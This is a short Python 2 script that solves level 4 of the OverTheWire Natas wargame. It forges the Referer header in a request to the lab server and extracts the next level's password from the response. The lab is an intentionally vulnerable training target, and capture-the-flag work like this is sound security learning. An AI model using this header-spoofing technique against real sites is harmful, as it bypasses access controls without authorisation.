#!/usr/bin/python
# coding: utf-8
from requests.auth import HTTPBasicAuth
import requests
import sys
import re

def exploit(level4pass):
    print "{+} Natas Level 4. Doing magic..."
    try:
        headers = {"Referer": "http://natas5.natas.labs.overthewire.org/"}
        r = requests.get(url="http://natas4.natas.labs.overthewire.org/", headers=headers, auth=HTTPBasicAuth('natas4', level4pass))
    except Exception:
        print "{-} Something fucked up, request failed. Bailing. Maybe your password was wrong?"
        return None
    password = re.findall("natas5 is (.*?)\n", r.text)
    if len(password):
        return password[0]
    return None

def main(args):
    if len(args) != 2:
        sys.exit("use: %s level4password" %(args[0]))
    level5pass = exploit(args[1])
    if level5pass != None:
        print "{$$} Level 5 Password is: %s" %(level5pass)

if __name__ == "__main__":
    main(args=sys.argv)
